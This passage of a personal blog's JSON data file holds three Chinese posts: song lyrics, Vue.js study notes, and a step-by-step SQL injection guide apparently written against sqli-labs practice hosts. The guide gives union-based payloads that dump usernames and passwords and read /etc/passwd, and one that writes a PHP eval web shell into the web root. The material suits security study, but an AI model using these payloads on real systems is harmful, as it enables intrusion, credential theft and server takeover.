away\n这是决然离开的声音\n![在这里插入图片描述](https://img-blog.csdnimg.cn/a19c8884b98946f497f8466f4c4f33ed.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n \nIt's the sound of walking away\n这是决然离开的声音\nIt's the sound of walking away\n","source":"_posts/Sound of Walking Away.md","raw":"---\ntitle: Sound of Walking Away\ndate: 2021-08-23 00:00:46\ncategories: \n    - 日常\ntags: \n    - 日常\n    - 音乐推荐\nmp3: \ncover: img/bg14.jpg\n---\n\n\n![在这里插入图片描述](https://img-blog.csdnimg.cn/69628653da7948ea86c48e2ff0248662.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n\nDon't come find me, I won't be here waiting\n请别试图寻找我 我不会再原地等待\nI so can do it alone, you're not worth staying\n我自己可以过得很好 你不值得我再多停留\n\nWeren't listening but now there's no way you won't hear\n你不曾倾听 但现在你不得不听\nThere's a voice emerging in the night so loud and clear\n有个声音在耳畔萦绕 嘹亮清晰\nI'll turn it up like you turn me down, I'm not afraid\n即使你想让我低声细语我也要大声宣泄，我不会畏惧\nHit play, hit play\n叫嚣着 呼喊着\nIt's the sound of walking away\n这是决然离开的声音\n![在这里插入图片描述](https://img-blog.csdnimg.cn/a19c8884b98946f497f8466f4c4f33ed.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center)\n \nIt's the sound of walking away\n这是决然离开的声音\nIt's the sound of walking away\n","slug":"Sound of Walking Away","published":1,"updated":"2021-08-22T15:52:14.000Z","_id":"clg29vyge001oao9c7uub6bkb","comments":1,"layout":"post","photos":[],"link":"","content":"<p><img src=\"https://img-blog.csdnimg.cn/69628653da7948ea86c48e2ff0248662.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>Don’t come find me, I won’t be here waiting<br>请别试图寻找我 我不会再原地等待<br>I so can do it alone, you’re not worth staying<br>我自己可以过得很好 你不值得我再多停留</p>\n<p>Weren’t listening but now there’s no way you won’t hear<br>你不曾倾听 但现在你不得不听<br>There’s a voice emerging in the night so loud and clear<br>有个声音在耳畔萦绕 嘹亮清晰<br>I’ll turn it up like you turn me down, I’m not afraid<br>即使你想让我低声细语我也要大声宣泄，我不会畏惧<br>Hit play, hit play<br>叫嚣着 呼喊着<br>It’s the sound of walking away<br>这是决然离开的声音<br><img src=\"https://img-blog.csdnimg.cn/a19c8884b98946f497f8466f4c4f33ed.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>It’s the sound of walking away<br>这是决然离开的声音<br>It’s the sound of walking away</p>\n","site":{"data":{}},"excerpt":"","more":"<p><img src=\"https://img-blog.csdnimg.cn/69628653da7948ea86c48e2ff0248662.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>Don’t come find me, I won’t be here waiting<br>请别试图寻找我 我不会再原地等待<br>I so can do it alone, you’re not worth staying<br>我自己可以过得很好 你不值得我再多停留</p>\n<p>Weren’t listening but now there’s no way you won’t hear<br>你不曾倾听 但现在你不得不听<br>There’s a voice emerging in the night so loud and clear<br>有个声音在耳畔萦绕 嘹亮清晰<br>I’ll turn it up like you turn me down, I’m not afraid<br>即使你想让我低声细语我也要大声宣泄，我不会畏惧<br>Hit play, hit play<br>叫嚣着 呼喊着<br>It’s the sound of walking away<br>这是决然离开的声音<br><img src=\"https://img-blog.csdnimg.cn/a19c8884b98946f497f8466f4c4f33ed.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTQ5NDI2,size_16,color_FFFFFF,t_70#pic_center\" alt=\"在这里插入图片描述\"></p>\n<p>It’s the sound of walking away<br>这是决然离开的声音<br>It’s the sound of walking away</p>\n"},{"title":"SQL注入步骤","date":"2021-07-22T03:20:00.000Z","mp3":null,"cover":"img/bg5.jpeg","_content":"\n\n\n## SQL注入漏洞\n\n### 1、找注入点（' \" ) ))）\n\nselect * from users where id ='1'#' limit 0,1;\nhttp://d1e1c384.yunyansec.com/Less-1/?id=1'#\n\n### 2、判断是否存在注入\n\nselect * from users where id ='1' and 1=1#' limit 0,1;\nselect * from users where id ='1' and 1=2#' limit 0,1;\n\n### 3、判断列数\n\nselect * from users where id ='1' order by 3#' limit 0,1;\n\n### 4、判断显示位\n\nselect * from users where id ='-1' union select 1,2,3#' limit 0,1\n\n### 5、爆用户、爆库\n\nselect * from users where id ='-1' union select 1,user(),3#' limit 0,1\nhttp://d1e1c384.yunyansec.com/Less-1/?id=-1' union select 1,user(),database()--+\n\n### 6、爆数据表名\n\ngroup_concat()\nselect * from users where id ='-1' unoin select 1,user(),table_name from information_schema.tables where table_schema=\"security\" limit 0,1#' limit 0,1;\n\n### 7、爆数据列名\n\nselect * from users where id ='-1' unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name=\"users\"#' limit 0,1;\nhttp://1c96113c.yunyansec.com/Less-1/?id=-1' union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=\"users\"--+\n\n### 8、获取数据\n\nselect * from users where id ='-1' unoin select 1,user(),group_concat(id,username,password) from users#' limit 0,1;\n\n### 9、读取服务器敏感文件\n\nload_file(\"/etc/passwd\")\n?id=-1' union select 1,2,load_file(\"/etc/passwd\")%23\n10、获取服务器权限，写入木马\n?id=-1' union select 1,2,'<?php eval(\\$_POST[123]);?>' into outfile '/var/www/html/2.php'%23\n\nselect * from users where uname='admin'#' and passwd='123456'","source":"_posts/SQL注入.md","raw":"---\ntitle: SQL注入步骤\ndate: 2021-07-22 11:20:00\ncategories: \n    - 网络安全\ntags: \n    - Web\n    - SQL\nmp3: \ncover: img/bg5.jpeg\n---\n\n\n\n## SQL注入漏洞\n\n### 1、找注入点（' \" ) ))）\n\nselect * from users where id ='1'#' limit 0,1;\nhttp://d1e1c384.yunyansec.com/Less-1/?id=1'#\n\n### 2、判断是否存在注入\n\nselect * from users where id ='1' and 1=1#' limit 0,1;\nselect * from users where id ='1' and 1=2#' limit 0,1;\n\n### 3、判断列数\n\nselect * from users where id ='1' order by 3#' limit 0,1;\n\n### 4、判断显示位\n\nselect * from users where id ='-1' union select 1,2,3#' limit 0,1\n\n### 5、爆用户、爆库\n\nselect * from users where id ='-1' union select 1,user(),3#' limit 0,1\nhttp://d1e1c384.yunyansec.com/Less-1/?id=-1' union select 1,user(),database()--+\n\n### 6、爆数据表名\n\ngroup_concat()\nselect * from users where id ='-1' unoin select 1,user(),table_name from information_schema.tables where table_schema=\"security\" limit 0,1#' limit 0,1;\n\n### 7、爆数据列名\n\nselect * from users where id ='-1' unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name=\"users\"#' limit 0,1;\nhttp://1c96113c.yunyansec.com/Less-1/?id=-1' union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=\"users\"--+\n\n### 8、获取数据\n\nselect * from users where id ='-1' unoin select 1,user(),group_concat(id,username,password) from users#' limit 0,1;\n\n### 9、读取服务器敏感文件\n\nload_file(\"/etc/passwd\")\n?id=-1' union select 1,2,load_file(\"/etc/passwd\")%23\n10、获取服务器权限，写入木马\n?id=-1' union select 1,2,'<?php eval(\\$_POST[123]);?>' into outfile '/var/www/html/2.php'%23\n\nselect * from users where uname='admin'#' and passwd='123456'","slug":"SQL注入","published":1,"updated":"2021-07-22T05:45:06.000Z","_id":"clg29vyge001pao9cfdj6ecse","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"SQL注入漏洞\"><a href=\"#SQL注入漏洞\" class=\"headerlink\" title=\"SQL注入漏洞\"></a>SQL注入漏洞</h2><h3 id=\"1、找注入点（’-“-）\"><a href=\"#1、找注入点（’-“-）\" class=\"headerlink\" title=\"1、找注入点（’ “ ) ))）\"></a>1、找注入点（’ “ ) ))）</h3><p>select * from users where id =’1’#’ limit 0,1;<br><a href=\"http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#\">http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#</a></p>\n<h3 id=\"2、判断是否存在注入\"><a href=\"#2、判断是否存在注入\" class=\"headerlink\" title=\"2、判断是否存在注入\"></a>2、判断是否存在注入</h3><p>select * from users where id =’1’ and 1=1#’ limit 0,1;<br>select * from users where id =’1’ and 1=2#’ limit 0,1;</p>\n<h3 id=\"3、判断列数\"><a href=\"#3、判断列数\" class=\"headerlink\" title=\"3、判断列数\"></a>3、判断列数</h3><p>select * from users where id =’1’ order by 3#’ limit 0,1;</p>\n<h3 id=\"4、判断显示位\"><a href=\"#4、判断显示位\" class=\"headerlink\" title=\"4、判断显示位\"></a>4、判断显示位</h3><p>select * from users where id =’-1’ union select 1,2,3#’ limit 0,1</p>\n<h3 id=\"5、爆用户、爆库\"><a href=\"#5、爆用户、爆库\" class=\"headerlink\" title=\"5、爆用户、爆库\"></a>5、爆用户、爆库</h3><p>select * from users where id =’-1’ union select 1,user(),3#’ limit 0,1<br><a href=\"http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39;\">http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,user(),database()–+</p>\n<h3 id=\"6、爆数据表名\"><a href=\"#6、爆数据表名\" class=\"headerlink\" title=\"6、爆数据表名\"></a>6、爆数据表名</h3><p>group_concat()<br>select * from users where id =’-1’ unoin select 1,user(),table_name from information_schema.tables where table_schema=”security” limit 0,1#’ limit 0,1;</p>\n<h3 id=\"7、爆数据列名\"><a href=\"#7、爆数据列名\" class=\"headerlink\" title=\"7、爆数据列名\"></a>7、爆数据列名</h3><p>select * from users where id =’-1’ unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”#’ limit 0,1;<br><a href=\"http://1c96113c.yunyansec.com/Less-1/?id=-1&#39;\">http://1c96113c.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”–+</p>\n<h3 id=\"8、获取数据\"><a href=\"#8、获取数据\" class=\"headerlink\" title=\"8、获取数据\"></a>8、获取数据</h3><p>select * from users where id =’-1’ unoin select 1,user(),group_concat(id,username,password) from users#’ limit 0,1;</p>\n<h3 id=\"9、读取服务器敏感文件\"><a href=\"#9、读取服务器敏感文件\" class=\"headerlink\" title=\"9、读取服务器敏感文件\"></a>9、读取服务器敏感文件</h3><p>load_file(“/etc/passwd”)<br>?id=-1’ union select 1,2,load_file(“/etc/passwd”)%23<br>10、获取服务器权限，写入木马<br>?id=-1’ union select 1,2,’<?php eval(\\$_POST[123]);?>‘ into outfile ‘/var/www/html/2.php’%23</p>\n<p>select * from users where uname=’admin’#’ and passwd=’123456’</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"SQL注入漏洞\"><a href=\"#SQL注入漏洞\" class=\"headerlink\" title=\"SQL注入漏洞\"></a>SQL注入漏洞</h2><h3 id=\"1、找注入点（’-“-）\"><a href=\"#1、找注入点（’-“-）\" class=\"headerlink\" title=\"1、找注入点（’ “ ) ))）\"></a>1、找注入点（’ “ ) ))）</h3><p>select * from users where id =’1’#’ limit 0,1;<br><a href=\"http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#\">http://d1e1c384.yunyansec.com/Less-1/?id=1&#39;#</a></p>\n<h3 id=\"2、判断是否存在注入\"><a href=\"#2、判断是否存在注入\" class=\"headerlink\" title=\"2、判断是否存在注入\"></a>2、判断是否存在注入</h3><p>select * from users where id =’1’ and 1=1#’ limit 0,1;<br>select * from users where id =’1’ and 1=2#’ limit 0,1;</p>\n<h3 id=\"3、判断列数\"><a href=\"#3、判断列数\" class=\"headerlink\" title=\"3、判断列数\"></a>3、判断列数</h3><p>select * from users where id =’1’ order by 3#’ limit 0,1;</p>\n<h3 id=\"4、判断显示位\"><a href=\"#4、判断显示位\" class=\"headerlink\" title=\"4、判断显示位\"></a>4、判断显示位</h3><p>select * from users where id =’-1’ union select 1,2,3#’ limit 0,1</p>\n<h3 id=\"5、爆用户、爆库\"><a href=\"#5、爆用户、爆库\" class=\"headerlink\" title=\"5、爆用户、爆库\"></a>5、爆用户、爆库</h3><p>select * from users where id =’-1’ union select 1,user(),3#’ limit 0,1<br><a href=\"http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39;\">http://d1e1c384.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,user(),database()–+</p>\n<h3 id=\"6、爆数据表名\"><a href=\"#6、爆数据表名\" class=\"headerlink\" title=\"6、爆数据表名\"></a>6、爆数据表名</h3><p>group_concat()<br>select * from users where id =’-1’ unoin select 1,user(),table_name from information_schema.tables where table_schema=”security” limit 0,1#’ limit 0,1;</p>\n<h3 id=\"7、爆数据列名\"><a href=\"#7、爆数据列名\" class=\"headerlink\" title=\"7、爆数据列名\"></a>7、爆数据列名</h3><p>select * from users where id =’-1’ unoin select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”#’ limit 0,1;<br><a href=\"http://1c96113c.yunyansec.com/Less-1/?id=-1&#39;\">http://1c96113c.yunyansec.com/Less-1/?id=-1&#39;</a> union select 1,user(),group_concat(column_name) from information_schema.columns where table_name=”users”–+</p>\n<h3 id=\"8、获取数据\"><a href=\"#8、获取数据\" class=\"headerlink\" title=\"8、获取数据\"></a>8、获取数据</h3><p>select * from users where id =’-1’ unoin select 1,user(),group_concat(id,username,password) from users#’ limit 0,1;</p>\n<h3 id=\"9、读取服务器敏感文件\"><a href=\"#9、读取服务器敏感文件\" class=\"headerlink\" title=\"9、读取服务器敏感文件\"></a>9、读取服务器敏感文件</h3><p>load_file(“/etc/passwd”)<br>?id=-1’ union select 1,2,load_file(“/etc/passwd”)%23<br>10、获取服务器权限，写入木马<br>?id=-1’ union select 1,2,’<?php eval(\\$_POST[123]);?>‘ into outfile ‘/var/www/html/2.php’%23</p>\n<p>select * from users where uname=’admin’#’ and passwd=’123456’</p>\n"},{"title":"Vue.js实战（1）","date":"2020-11-17T13:33:45.000Z","mp3":null,"cover":"img/bg3.jpg","_content":"\n\n# Ch1\n\n功能：\n\n解耦视图与数据\n\n可复用组件\n\n前端路由\n\n状态管理\n\n虚拟Dom\n\n### 1.MVVM模式（Model-View-View-Model）\n\n# Ch2\n\n## 一、Vue实例与数据绑定\n\n### 1.数据绑定\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n</head>\n<body>\n    <div id=\"app\">\n    \t//插值{{}}\n        Welcome to home:{{ home }}\n    </div>\n\n    <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                home:' http://www.lishengwang.top',\n            }\n        })\n    </script>\n</body>\n</html>\n```\n\n### 2.生命周期\n\n​\ta.created:完成数据观测，未挂载；\n\n​\tb.mounted：el挂载到实例；\n\n​\tc.beforeDestory：实例销毁前，解绑addEventListener监听事件等；\n\n### 3.v-html\n\n```html\n <span v-html=\"html1\"></span>\n \n   <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                home:' http://www.lishengwang.top',\n                html1:'<a href=\"http://www.lishengwang.top\">Click!</a>'\n            }\n        })\n    </script>\n```\n\n### 4.filter过滤器\n\n```vue\n{{ a|b }}\n```\n\n## 二、指令与事件\n\n​\t1.v-if\n\n```html\n  <div v-if=\"show\">\n            V-if实例\n  </div>\n        \n   data:{\n                show:true\n            },\n```\n\n​\t2.v-bind:绑定数据，随数据变化进行更新\n\n```\n <a v-bind:href=\"home\">V-bind</a>\n```\n\n​\t3.v-on：绑定事件\n\n```html\n  <div v-if=\"show\">\n            V-if实例\n        </div>\n        <div>\n            <button v-on:click=\"notToShow\">点击隐藏</button>\n            <button v-on:click=\"toShow\">点击显示</button>\n        </div>\n        \n     methods:{\n                notToShow:function(){\n                    this.show=false\n                },\n                toShow:function(){\n                    this.show=true\n                }\n```\n\n​\t4.v-model:绑定数据\n\n​\t  \n\n```html\n  <div>\n            Name：{{ good.name }}\n            Price: {{ good.price }}\n            Count: {{ good.count }}\n\n            All in: {{ all_price }}\n        </div>\n        <div>\n\n            <span>新价格：<input type=\"text\" v-model=\"good.price\"></span>\n            </br>\n            <span>新数量：<input type=\"text\" v-model=\"good.count\"></span>\n        </div>\n```\n\n4.语法糖\n\n​\t（1）\n\n```html\n #v-on ===> @\n <button v-on:click=\"notToShow\">点击隐藏</button>\n <button @click=\"notToShow\">点击隐藏</button>\n \n #v-bindd ===> :\n <a v-bind:href=\"#\"></a>\n <a :href=\"#\"></a>\n```\n\n","source":"_posts/Vue.js实战（1）.md","raw":"---\ntitle: Vue.js实战（1）\ndate: 2020-11-17 21:33:45\ncategories: \n    - 前端\ntags: \n    - VUE\n    - 笔记\n    - Vue.js实战\nmp3: \ncover: img/bg3.jpg\n---\n\n\n# Ch1\n\n功能：\n\n解耦视图与数据\n\n可复用组件\n\n前端路由\n\n状态管理\n\n虚拟Dom\n\n### 1.MVVM模式（Model-View-View-Model）\n\n# Ch2\n\n## 一、Vue实例与数据绑定\n\n### 1.数据绑定\n\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Document</title>\n    <script src=\"./js/vue.js\"></script>\n</head>\n<body>\n    <div id=\"app\">\n    \t//插值{{}}\n        Welcome to home:{{ home }}\n    </div>\n\n    <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                home:' http://www.lishengwang.top',\n            }\n        })\n    </script>\n</body>\n</html>\n```\n\n### 2.生命周期\n\n​\ta.created:完成数据观测，未挂载；\n\n​\tb.mounted：el挂载到实例；\n\n​\tc.beforeDestory：实例销毁前，解绑addEventListener监听事件等；\n\n### 3.v-html\n\n```html\n <span v-html=\"html1\"></span>\n \n   <script>\n        var app=new Vue({\n            el:\"#app\",\n            data:{\n                home:' http://www.lishengwang.top',\n                html1:'<a href=\"http://www.lishengwang.top\">Click!</a>'\n            }\n        })\n    </script>\n```\n\n### 4.filter过滤器\n\n```vue\n{{ a|b }}\n```\n\n## 二、指令与事件\n\n​\t1.v-if\n\n```html\n  <div v-if=\"show\">\n            V-if实例\n  </div>\n        \n   data:{\n                show:true\n            },\n```\n\n​\t2.v-bind:绑定数据，随数据变化进行更新\n\n```\n <a v-bind:href=\"home\">V-bind</a>\n```\n\n​\t3.v-on：绑定事件\n\n```html\n  <div v-if=\"show\">\n            V-if实例\n        </div>\n        <div>\n            <button v-on:click=\"notToShow\">点击隐藏</button>\n            <button v-on:click=\"toShow\">点击显示</button>\n        </div>\n        \n     methods:{\n                notToShow:function(){\n                    this.show=false\n                },\n                toShow:function(){\n                    this.show=true\n                }\n```\n\n​\t4.v-model:绑定数据\n\n​\t  \n\n```html\n  <div>\n            Name：{{ good.name }}\n            Price: {{ good.price }}\n            Count: {{ good.count }}\n\n            All in: {{ all_price }}\n        </div>\n        <div>\n\n            <span>新价格：<input type=\"text\" v-model=\"good.price\"></span>\n            </br>\n            <span>新数量：<input type=\"text\" v-model=\"good.count\"></span>\n        </div>\n```\n\n4.语法糖\n\n​\t（1）\n\n```html\n #v-on ===> @\n <button v-on:click=\"notToShow\">点击隐藏</button>\n <button @click=\"notToShow\">点击隐藏</button>\n \n #v-bindd ===> :\n <a v-bind:href=\"#\"></a>\n <a :href=\"#\"></a>\n```\n\n","slug":"Vue.js实战（1）","published":1,"updated":"2021-01-26T12:17:34.000Z","_id":"clg29vygg001sao9c3399btlw","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"Ch1\"><a href=\"#Ch1\" class=\"headerlink\" title=\"Ch1\"></a>Ch1</h1><p>功能：</p>\n<p>解耦视图与数据</p>\n<p>可复用组件</p>\n<p>前端路由</p>\n<p>状态管理</p>\n<p>虚拟Dom</p>\n<h3 id=\"1-MVVM模式（Model-View-View-Model）\"><a href=\"#1-MVVM模式（Model-View-View-Model）\" class=\"headerlink\" title=\"1.MVVM模式（Model-View-View-Model）\"></a>1.MVVM模式（Model-View-View-Model）</h3><h1 id=\"Ch2\"><a href=\"#Ch2\" class=\"headerlink\" title=\"Ch2\"></a>Ch2</h1><h2 id=\"一、Vue实例与数据绑定\"><a href=\"#一、Vue实例与数据绑定\" class=\"headerlink\" title=\"一、Vue实例与数据绑定\"></a>一、Vue实例与数据绑定</h2><h3 id=\"1-数据绑定\"><a href=\"#1-数据绑定\" class=\"headerlink\" title=\"1.数据绑定\"></a>1.数据绑定</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">head</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">charset</span>=<span class=\"hljs-string\">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">meta</span> <span class=\"hljs-attr\">name</span>=<span class=\"hljs-string\">&quot;viewport&quot;</span> <span class=\"hljs-attr\">content</span>=<span class=\"hljs-string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">title</span>&gt;</span>Document<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">title</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">&quot;./js/vue.js&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">head</span>&gt;</span><br><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">body</span>&gt;</span><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">id</span>=<span class=\"hljs-string\">&quot;app&quot;</span>&gt;</span><br>    \t//插值&#123;&#123;&#125;&#125;<br>        Welcome to home:&#123;&#123; home &#125;&#125;<br>    <span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br><br>    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">        <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">            <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">                <span class=\"hljs-attr\">home</span>:<span class=\"hljs-string\">&#x27; http://www.lishengwang.top&#x27;</span>,</span><br><span class=\"language-javascript\">            &#125;</span><br><span class=\"language-javascript\">        &#125;)</span><br><span class=\"language-javascript\">    </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">body</span>&gt;</span><br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">html</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-生命周期\"><a href=\"#2-生命周期\" class=\"headerlink\" title=\"2.生命周期\"></a>2.生命周期</h3><p>​    a.created:完成数据观测，未挂载；</p>\n<p>​    b.mounted：el挂载到实例；</p>\n<p>​    c.beforeDestory：实例销毁前，解绑addEventListener监听事件等；</p>\n<h3 id=\"3-v-html\"><a href=\"#3-v-html\" class=\"headerlink\" title=\"3.v-html\"></a>3.v-html</h3><figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">span</span> <span class=\"hljs-attr\">v-html</span>=<span class=\"hljs-string\">&quot;html1&quot;</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">span</span>&gt;</span><br><br>  <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"language-javascript\"></span><br><span class=\"language-javascript\">       <span class=\"hljs-keyword\">var</span> app=<span class=\"hljs-keyword\">new</span> <span class=\"hljs-title class_\">Vue</span>(&#123;</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">el</span>:<span class=\"hljs-string\">&quot;#app&quot;</span>,</span><br><span class=\"language-javascript\">           <span class=\"hljs-attr\">data</span>:&#123;</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">home</span>:<span class=\"hljs-string\">&#x27; http://www.lishengwang.top&#x27;</span>,</span><br><span class=\"language-javascript\">               <span class=\"hljs-attr\">html1</span>:<span class=\"hljs-string\">&#x27;&lt;a href=&quot;http://www.lishengwang.top&quot;&gt;Click!&lt;/a&gt;&#x27;</span></span><br><span class=\"language-javascript\">           &#125;</span><br><span class=\"language-javascript\">       &#125;)</span><br><span class=\"language-javascript\">   </span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<h3 id=\"4-filter过滤器\"><a href=\"#4-filter过滤器\" class=\"headerlink\" title=\"4.filter过滤器\"></a>4.filter过滤器</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs vue\">&#123;&#123; a|b &#125;&#125;<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"二、指令与事件\"><a href=\"#二、指令与事件\" class=\"headerlink\" title=\"二、指令与事件\"></a>二、指令与事件</h2><p>​    1.v-if</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">div</span> <span class=\"hljs-attr\">v-if</span>=<span class=\"hljs-string\">&quot;show&quot;</span>&gt;</span><br>          V-if实例<br><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">div</span>&gt;</span><br>      <br> data:&#123;<br>              show:true<br>          &#125;,<br></code></pre></td></tr></table></figure>\n\n<p>​    2.v-bind:绑定数据，随数据变化进行更新</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">a</span> <span class=\"hljs-attr\">v-bind:href</span>=<span class=\"hljs-string\">&quot;home&quot;</span>&gt;</span>V-bind<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">a</span>&gt;</span><br></code></pre></td></tr></table></figure>\n\n<p>​    3.v-on：绑定事件</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span 